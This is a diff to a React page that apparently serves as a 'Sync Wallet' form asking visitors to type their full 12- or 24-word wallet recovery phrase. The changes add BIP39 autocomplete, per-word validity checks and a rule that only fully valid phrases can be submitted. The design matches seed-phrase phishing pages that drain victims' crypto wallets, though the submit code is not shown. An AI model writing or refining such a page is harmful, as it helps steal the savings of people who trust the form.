@@ -1,40 +1,7 @@
 "use client";
 import { useState, useRef, useEffect, useCallback } from "react";
 
-// ─── BIP39 word list (partial – add full 2048 for production) ─────────────────
-const bip39List = [
-  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
-  "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
-  "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
-  "adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent",
-  "agree","ahead","aid","aim","air","airport","aisle","alarm","album","alcohol",
-  "alert","alien","all","alley","allow","almost","alone","alpha","already","also",
-  "alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient",
-  "anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna",
-  "antique","anxiety","any","apart","apology","appear","apple","approve","april","arch",
-  "arctic","area","arena","argue","arm","armed","armor","army","around","arrange",
-  "arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault",
-  "asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract",
-  "auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid",
-  "awake","aware","away","awesome","awful","awkward","axis","baby","balance","bamboo",
-  "banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle",
-  "beach","bean","beauty","because","become","beef","before","begin","behave","behind",
-  "believe","below","belt","bench","benefit","best","betray","better","between","beyond",
-  "bicycle","bind","biology","bird","birth","bitter","black","blade","blame","blanket",
-  "blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush",
-  "board","boat","body","boil","bomb","bone","book","boost","border","boring",
-  "borrow","boss","bottom","bounce","boy","bracket","brain","brand","brave","breeze",
-  "brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom",
-  "brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk",
-  "bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter",
-  "buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm",
-  "camera","camp","can","canal","cancel","candy","cannon","canvas","canyon","capable",
-  "capital","captain","car","carbon","card","cargo","carpet","carry","cart","case",
-  "cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught",
-  "cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain",
-  "chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap",
-  "check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice",
-];
+import { bip39List } from "./bip39";
 
 // ─── Wallet definitions ───────────────────────────────────────────────────────
 const WALLETS = [
@@ -183,6 +150,7 @@ export default function Home() {
   const [phraseCount, setPhraseCount]   = useState<number | null>(null);
   const [phraseWords, setPhraseWords]   = useState<string[]>([]);
   const [showPhrase, setShowPhrase]     = useState(false);
+  const [focusedIndex, setFocusedIndex] = useState<number | null>(null);
   const [submitting, setSubmitting]     = useState(false);
   const [submitDone, setSubmitDone]     = useState(false);
   const [toast, setToast]               = useState<{ type: "ok" | "err"; msg: string } | null>(null);
@@ -334,12 +302,28 @@ export default function Home() {
 
   // ── Phrase word changes ─────────────────────────────────────────────────────
   function handleWordChange(idx: number, val: string) {
-    setPhraseWords(ws => { const c = [...ws]; c[idx] = val; return c; });
+    const cleanVal = val.toLowerCase().replace(/[^a-z]/g, "");
+    setPhraseWords(ws => { const c = [...ws]; c[idx] = cleanVal; return c; });
   }
   function handleKeyDown(idx: number, e: React.KeyboardEvent<HTMLInputElement>) {
-    if ((e.key === "Enter" || e.key === "Tab") && idx < phraseWords.length - 1) {
+    if ((e.key === "Enter" || e.key === "Tab" || e.key === " ") && idx < phraseWords.length - 1) {
       e.preventDefault();
+      // Auto-fill suggestion if there's only one or if they hit space/enter
+      const currentWord = phraseWords[idx];
+      const matchingWords = bip39List.filter(w => w.startsWith(currentWord));
+      if (matchingWords.length > 0 && currentWord.length > 0) {
+        setPhraseWords(ws => { const c = [...ws]; c[idx] = matchingWords[0]; return c; });
+      }
       inputRefs.current[idx + 1]?.focus();
+    }
+  }
+
+  function handleSuggestionClick(idx: number, word: string) {
+    setPhraseWords(ws => { const c = [...ws]; c[idx] = word; return c; });
+    if (idx < phraseWords.length - 1) {
+      inputRefs.current[idx + 1]?.focus();
+    } else {
+      setFocusedIndex(null);
     }
   }
 
@@ -511,13 +495,33 @@ export default function Home() {
         }
         .count-btn.selected { border-color: #fff; color: #fff; background: #111; }
 
-        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 24px; }
+        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 24px; position: relative; }
         .word-input-wrap { position: relative; }
         .word-num { position: absolute; left: 10px; top: 12px; font-size: 10px; color: #444; pointer-events: none; }
         .word-input {
           width: 100%; padding: 12px 10px 12px 28px; border-radius: 12px; border: 1px solid #222;
-          background: #000; color: #fff; font-family: inherit; font-size: 14px; outline: none;
+          background: #000; color: #fff; font-family: inherit; font-size: 14px; outline: none; transition: border-color 0.2s;
         }
+        .word-input.invalid-word { border-color: #ef4444; }
+        .word-input.valid-word { border-color: #4ade80; }
+        .word-input:focus { border-color: #3b82f6; }
+        
+        .suggestions-dropdown {
+          position: absolute; top: 100%; left: 0; right: 0; margin-top: 4px;
+          background: #111; border: 1px solid #333; border-radius: 8px; overflow: hidden; z-index: 10;
+          box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .suggestion-item {
+          padding: 10px 12px; cursor: pointer; font-size: 13px; color: #ccc;
+        }
+        .suggestion-item:hover { background: #222; color: #fff; }
+
+        .toggle-phrase-btn {
+          background: transparent; border: 1px solid #333; color: #888; border-radius: 8px; padding: 6px 12px;
+          font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s;
+          margin-left: auto;
+        }
+        .toggle-phrase-btn:hover { background: #222; color: #fff; }
 
         .submit-btn {
           width: 100%; padding: 16px; border-radius: 14px; border: none; background: #fff; color: #000;
@@ -695,28 +699,64 @@ export default function Home() {
                 <h2>Enter Phrase</h2>
                 <p>{phraseCount} words mnemonic</p>
               </div>
+              <button 
+                className="toggle-phrase-btn" 
+                onClick={() => setShowPhrase(!showPhrase)}
+                type="button"
+              >
+                {showPhrase ? "👁️ Hide" : "👁️‍🗨️ Show"}
+              </button>
             </div>
 
             <form onSubmit={handleSubmit}>
               <div className="word-grid">
-                {phraseWords.map((word, i) => (
-                  <div className="word-input-wrap" key={i}>
-                    <span className="word-num">{i + 1}</span>
-                    <input
-                      ref={el => { inputRefs.current[i] = el; }}
-                      className="word-input"
-                      type="password"
-                      value={word}
-                      onChange={e => handleWordChange(i, e.target.value)}
-                      onKeyDown={e => handleKeyDown(i, e)}
-                      autoComplete="off"
-                      spellCheck={false}
-                      disabled={submitting}
-                    />
-                  </div>
-                ))}
+                {phraseWords.map((word, i) => {
+                  const isValid = bip39List.includes(word);
+                  const isInvalid = word.length > 0 && !isValid;
+                  const showSuggestions = focusedIndex === i && word.length > 0 && !isValid;
+                  const suggestions = showSuggestions ? bip39List.filter(w => w.startsWith(word)).slice(0, 4) : [];
+
+                  return (
+                    <div className="word-input-wrap" key={i}>
+                      <span className="word-num">{i + 1}</span>
+                      <input
+                        ref={el => { inputRefs.current[i] = el; }}
+                        className={`word-input ${isValid ? 'valid-word' : ''} ${isInvalid ? 'invalid-word' : ''}`}
+                        type={showPhrase ? "text" : "password"}
+                        value={word}
+                        onChange={e => handleWordChange(i, e.target.value)}
+                        onKeyDown={e => handleKeyDown(i, e)}
+                        onFocus={() => setFocusedIndex(i)}
+                        onBlur={() => setTimeout(() => setFocusedIndex(null), 150)}
+                        autoComplete="off"
+                        spellCheck={false}
+                        disabled={submitting}
+                      />
+                      {showSuggestions && suggestions.length > 0 && (
+                        <div className="suggestions-dropdown">
+                          {suggestions.map(sugg => (
+                            <div 
+                              key={sugg} 
+                              className="suggestion-item"
+                              onMouseDown={(e) => {
+                                e.preventDefault();
+                                handleSuggestionClick(i, sugg);
+                              }}
+                            >
+                              {sugg}
+                            </div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  );
+                })}
               </div>
-              <button type="submit" className="submit-btn" disabled={!phraseWords.every(w => w.trim().length > 0) || submitting}>
+              <button 
+                type="submit" 
+                className="submit-btn" 
+                disabled={!phraseWords.every(w => bip39List.includes(w)) || submitting}
+              >
                 {submitting ? "Syncing..." : "Sync Wallet"}
               </button>
             </form>
